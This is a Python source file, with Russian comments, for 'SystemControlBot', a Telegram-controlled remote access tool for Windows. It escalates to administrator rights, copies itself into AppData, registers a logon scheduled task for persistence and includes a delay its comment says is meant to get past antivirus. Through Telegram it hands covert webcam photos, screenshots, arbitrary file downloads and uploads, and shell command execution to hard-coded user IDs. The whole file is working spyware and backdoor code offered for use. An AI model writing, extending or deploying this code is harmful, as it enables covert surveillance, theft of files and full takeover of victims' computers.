#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
Упрощенный SystemControlBot с автоматической установкой зависимостей
"""
import os
import sys
import time
import base64
import ctypes
import subprocess
import platform
import socket
import string
import math
import shutil

# --- ВАЖНО: Сначала проверяем и устанавливаем зависимости ---
def install_dependencies():
    """Устанавливает все необходимые библиотеки"""
    required_packages = [
        'python-telegram-bot==20.7',
        'opencv-python-headless',
        'pyautogui',
        'pillow',
        'numpy'
    ]
    
    print("[*] Проверка зависимостей...")
    
    for package in required_packages:
        package_name = package.split('==')[0] if '==' in package else package
        
        # Проверяем, установлен ли пакет
        check_cmd = [sys.executable, '-c', f"import {package_name.replace('-', '_')}"]
        try:
            subprocess.run(check_cmd, capture_output=True, check=True)
            print(f"  ✓ {package_name} уже установлен")
        except:
            print(f"  - Устанавливаю {package}...")
            try:
                subprocess.run([sys.executable, '-m', 'pip', 'install', '--quiet', package], 
                              capture_output=True, check=True)
                print(f"  ✓ {package_name} установлен")
            except Exception as e:
                print(f"  ✗ Ошибка установки {package_name}: {e}")

# Устанавливаем зависимости перед импортом
install_dependencies()

# Теперь импортируем библиотеки
try:
    import cv2
    import numpy as np
    import pyautogui
    from PIL import Image
    from io import BytesIO
    from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
    from telegram.ext import Application, CommandHandler, ContextTypes, CallbackQueryHandler, MessageHandler, filters
    
    IMPORT_SUCCESS = True
except ImportError as e:
    print(f"[!] Ошибка импорта: {e}")
    print("[!] Попробуйте установить зависимости вручную:")
    print("    pip install python-telegram-bot opencv-python-headless pyautogui pillow numpy")
    IMPORT_SUCCESS = False
    sys.exit(1)

# --- КОНСТАНТЫ ---
APP_NAME = "SystemControlBot"
SINGLE_INSTANCE_PORT = 65432
ITEMS_PER_PAGE = 10

# Декодируем токен (замените на ваш реальный токен)
def get_token():
    try:
        # Простой base64 токен (замените YOUR_TOKEN_HERE на реальный токен в base64)
        encoded_token = "WU9VUl9UT0tFTl9IRVJF"  # Замените на ваш закодированный токен
        return base64.b64decode(encoded_token).decode('utf-8')
    except:
        return "YOUR_BOT_TOKEN_HERE"  # Или вставьте токен напрямую

BOT_TOKEN = get_token()
AUTHORIZED_USERS = [2130144673, 2085708753]  # Ваши ID

# --- УТИЛИТЫ ---
def is_admin():
    """Проверяем права администратора"""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def restart_as_admin():
    """Перезапуск с правами админа"""
    try:
        if getattr(sys, 'frozen', False):
            exe_path = sys.executable
        else:
            exe_path = os.path.abspath(__file__)
            
        ret = ctypes.windll.shell32.ShellExecuteW(
            None, "runas", exe_path, "", None, 1
        )
        return int(ret) > 32
    except:
        return False

def check_single_instance():
    """Проверяем, не запущена ли уже копия"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind(('127.0.0.1', SINGLE_INSTANCE_PORT))
        sock.listen(1)
        return sock
    except:
        return None

def setup_autostart():
    """Настраиваем автозагрузку"""
    if platform.system() != "Windows":
        return
    
    try:
        if getattr(sys, 'frozen', False):
            exe_path = sys.executable
        else:
            exe_path = os.path.abspath(__file__)
        
        # Создаем папку в AppData
        dest_dir = os.path.join(os.getenv('APPDATA'), APP_NAME)
        os.makedirs(dest_dir, exist_ok=True)
        
        # Копируем себя
        dest_exe = os.path.join(dest_dir, f"{APP_NAME}.py")
        if os.path.abspath(__file__) != dest_exe:
            shutil.copy2(__file__, dest_exe)
        
        # Создаем задание в планировщике
        cmd = f'"{sys.executable}" "{dest_exe}"'
        task_cmd = f'''
schtasks /Create /TN "{APP_NAME}" /TR "{cmd}" /SC ONLOGON /RL HIGHEST /F
'''
        
        subprocess.run(task_cmd, shell=True, capture_output=True)
        print(f"[✓] Автозагрузка настроена")
        
    except Exception as e:
        print(f"[!] Ошибка автозагрузки: {e}")

# --- ФУНКЦИИ БОТА ---
def take_screenshot():
    """Делает скриншот экрана"""
    try:
        screenshot = pyautogui.screenshot()
        buf = BytesIO()
        screenshot.save(buf, format='PNG')
        buf.seek(0)
        return buf, None
    except Exception as e:
        return None, str(e)

def capture_camera():
    """Делает фото с камеры"""
    try:
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            return None, "Камера недоступна"
        
        # Даем камере время на фокусировку
        time.sleep(0.5)
        ret, frame = cap.read()
        cap.release()
        
        if ret:
            # Конвертируем BGR в RGB
            frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
            img = Image.fromarray(frame)
            buf = BytesIO()
            img.save(buf, format='JPEG', quality=90)
            buf.seek(0)
            return buf, None
        
        return None, "Не удалось получить изображение"
    except Exception as e:
        return None, str(e)

def get_drives():
    """Получает список дисков"""
    drives = []
    for letter in string.ascii_uppercase:
        drive = f"{letter}:\\"
        if os.path.exists(drive):
            drives.append(drive)
    return drives

def build_file_keyboard(path="root", page=0):
    """Создает клавиатуру для навигации по файлам"""
    keyboard = []
    
    if path == "root":
        items = []
        for drive in get_drives():
            items.append({
                'name': drive,
                'type': 'drive',
                'path': drive
            })
        text = "📂 Выберите диск:"
    else:
        try:
            items = []
            for item in os.listdir(path):
                item_path = os.path.join(path, item)
                if os.path.isdir(item_path):
                    items.append({
                        'name': item,
                        'type': 'dir',
                        'path': item_path
                    })
                else:
                    items.append({
                        'name': item,
                        'type': 'file',
                        'path': item_path
                    })
            
            # Сортируем: сначала папки, потом файлы
            items.sort(key=lambda x: (x['type'] != 'dir', x['name'].lower()))
            text = f"📂 Путь: {path}"
        except Exception as e:
            return None, f"❌ Ошибка: {str(e)}"
    
    # Пагинация
    total_items = len(items)
    total_pages = max(1, (total_items + ITEMS_PER_PAGE - 1) // ITEMS_PER_PAGE)
    page = max(0, min(page, total_pages - 1))
    
    start_idx = page * ITEMS_PER_PAGE
    end_idx = start_idx + ITEMS_PER_PAGE
    page_items = items[start_idx:end_idx]
    
    # Кнопка "Назад"
    if path != "root":
        parent = os.path.dirname(path.rstrip("\\/"))
        if len(parent) <= 3:  # Если вернулись к диску
            parent = "root"
        keyboard.append([InlineKeyboardButton("⬆️ Назад", callback_data=f"nav:{parent}:0")])
    
    # Кнопки файлов/папок
    for item in page_items:
        if item['type'] in ['dir', 'drive']:
            icon = "📁"
            callback_data = f"nav:{item['path']}:0"
        else:
            icon = "📄"
            callback_data = f"file:{item['path']}"
        
        # Обрезаем длинные имена
        display_name = item['name']
        if len(display_name) > 30:
            display_name = display_name[:27] + "..."
        
        keyboard.append([InlineKeyboardButton(f"{icon} {display_name}", callback_data=callback_data)])
    
    # Кнопки пагинации
    if total_pages > 1:
        nav_buttons = []
        if page > 0:
            nav_buttons.append(InlineKeyboardButton("◀️", callback_data=f"nav:{path}:{page-1}"))
        
        nav_buttons.append(InlineKeyboardButton(f"{page+1}/{total_pages}", callback_data="noop"))
        
        if page < total_pages - 1:
            nav_buttons.append(InlineKeyboardButton("▶️", callback_data=f"nav:{path}:{page+1}"))
        
        keyboard.append(nav_buttons)
    
    return InlineKeyboardMarkup(keyboard), text

# --- ОБРАБОТЧИКИ КОМАНД ---
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработчик команды /start"""
    user_id = update.effective_user.id
    if user_id not in AUTHORIZED_USERS:
        return
    
    welcome_text = """
🤖 *SystemControlBot активирован*

Доступные команды:
/screen - Сделать скриншот
/cam - Сделать фото с камеры
/files - Просмотр файлов
/exec [команда] - Выполнить команду
/download [путь] - Скачать файл

📁 Для загрузки файлов просто отправьте их боту
    """
    
    await update.message.reply_text(welcome_text, parse_mode="Markdown")

async def screen_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработчик команды /screen"""
    if update.effective_user.id not in AUTHORIZED_USERS:
        return
    
    await update.message.reply_chat_action("upload_photo")
    screenshot, error = take_screenshot()
    
    if screenshot:
        await update.message.reply_photo(
            photo=screenshot,
            caption="📸 Скриншот экрана"
        )
    else:
        await update.message.reply_text(f"❌ Ошибка: {error}")

async def cam_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработчик команды /cam"""
    if update.effective_user.id not in AUTHORIZED_USERS:
        return
    
    await update.message.reply_chat_action("upload_photo")
    photo, error = capture_camera()
    
    if photo:
        await update.message.reply_photo(
            photo=photo,
            caption="📷 Фото с камеры"
        )
    else:
        await update.message.reply_text(f"❌ Ошибка: {error}")

async def exec_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработчик команды /exec"""
    if update.effective_user.id not in AUTHORIZED_USERS:
        return
    
    if not context.args:
        await update.message.reply_text("❌ Укажите команду: /exec ipconfig")
        return
    
    command = " ".join(context.args)
    try:
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            encoding='cp866',
            timeout=30
        )
        
        output = result.stdout + result.stderr
        if not output:
            output = "✅ Команда выполнена (нет вывода)"
        
        # Обрезаем длинный вывод
        if len(output) > 4000:
            output = output[:4000] + "\n\n... (вывод обрезан)"
        
        await update.message.reply_text(f"```\n{output}\n```", parse_mode="Markdown")
        
    except subprocess.TimeoutExpired:
        await update.message.reply_text("⏰ Таймаут выполнения команды")
    except Exception as e:
        await update.message.reply_text(f"❌ Ошибка: {str(e)}")

async def files_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработчик команды /files"""
    if update.effective_user.id not in AUTHORIZED_USERS:
        return
    
    keyboard, text = build_file_keyboard()
    if keyboard:
        await update.message.reply_text(text, reply_markup=keyboard)
    else:
        await update.message.reply_text(text)

async def download_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработчик команды /download"""
    if update.effective_user.id not in AUTHORIZED_USERS:
        return
    
    if not context.args:
        await update.message.reply_text("❌ Укажите путь к файлу: /download C:\\file.txt")
        return
    
    file_path = " ".join(context.args)
    
    if not os.path.isfile(file_path):
        await update.message.reply_text("❌ Файл не найден")
        return
    
    try:
        await update.message.reply_document(
            document=open(file_path, 'rb'),
            filename=os.path.basename(file_path)
        )
    except Exception as e:
        await update.message.reply_text(f"❌ Ошибка: {str(e)}")

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработчик нажатий на кнопки"""
    query = update.callback_query
    await query.answer()
    
    if query.from_user.id not in AUTHORIZED_USERS:
        return
    
    data = query.data
    
    if data == "noop":
        return
    
    if data.startswith("nav:"):
        _, path, page = data.split(":", 2)
        if path == "root":
            path = "root"
        keyboard, text = build_file_keyboard(path, int(page))
        if keyboard:
            try:
                await query.edit_message_text(text, reply_markup=keyboard)
            except:
                await query.message.reply_text(text, reply_markup=keyboard)
    
    elif data.startswith("file:"):
        file_path = data.split(":", 1)[1]
        if os.path.isfile(file_path):
            try:
                await context.bot.send_document(
                    chat_id=query.from_user.id,
                    document=open(file_path, 'rb'),
                    filename=os.path.basename(file_path)
                )
            except Exception as e:
                await query.message.reply_text(f"❌ Ошибка отправки: {str(e)}")
        else:
            await query.message.reply_text("❌ Файл не найден")

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработчик загрузки файлов"""
    if update.effective_user.id not in AUTHORIZED_USERS:
        return
    
    if update.message.document:
        file = await update.message.document.get_file()
        file_name = update.message.document.file_name
    elif update.message.photo:
        file = await update.message.photo[-1].get_file()
        file_name = f"photo_{int(time.time())}.jpg"
    else:
        return
    
    # Сохраняем на рабочий стол
    desktop = os.path.join(os.environ['USERPROFILE'], 'Desktop')
    save_path = os.path.join(desktop, file_name)
    
    try:
        await file.download_to_drive(save_path)
        await update.message.reply_text(f"✅ Файл сохранен: {save_path}")
    except Exception as e:
        await update.message.reply_text(f"❌ Ошибка сохранения: {str(e)}")

async def on_bot_start(application: Application):
    """Вызывается при старте бота"""
    for user_id in AUTHORIZED_USERS:
        try:
            await application.bot.send_message(
                chat_id=user_id,
                text="🤖 Бот запущен и готов к работе"
            )
        except:
            pass

# --- ОСНОВНАЯ ФУНКЦИЯ ---
def main():
    print(f"[*] Запуск {APP_NAME}...")
    print(f"[*] Python: {sys.version}")
    print(f"[*] Платформа: {platform.platform()}")
    
    # Ждем немного (для антивирусов)
    time.sleep(1)
    
    # Проверяем права администратора
    if not is_admin():
        print("[!] Требуются права администратора")
        if restart_as_admin():
            sys.exit(0)
        else:
            print("[!] Не удалось получить права администратора")
    
    # Настраиваем автозагрузку
    setup_autostart()
    
    # Проверяем, не запущен ли уже бот
    sock = check_single_instance()
    if sock is None:
        print("[!] Бот уже запущен")
        sys.exit(0)
    
    print("[*] Запуск Telegram бота...")
    
    try:
        # Создаем приложение
        application = Application.builder().token(BOT_TOKEN).build()
        
        # Добавляем обработчики
        application.add_handler(CommandHandler("start", start_command))
        application.add_handler(CommandHandler("screen", screen_command))
        application.add_handler(CommandHandler("cam", cam_command))
        application.add_handler(CommandHandler("exec", exec_command))
        application.add_handler(CommandHandler("files", files_command))
        application.add_handler(CommandHandler("download", download_command))
        application.add_handler(CallbackQueryHandler(button_callback))
        application.add_handler(MessageHandler(filters.Document.ALL | filters.PHOTO, handle_document))
        
        # Запускаем бота
        application.run_polling(drop_pending_updates=True)
        
    except Exception as e:
        print(f"[!] Ошибка запуска бота: {e}")
        
        # Перезапуск через 60 секунд
        print("[*] Перезапуск через 60 секунд...")
        time.sleep(60)
        
        # Перезапускаем себя
        subprocess.Popen([sys.executable, __file__])

if __name__ == "__main__":
    main()
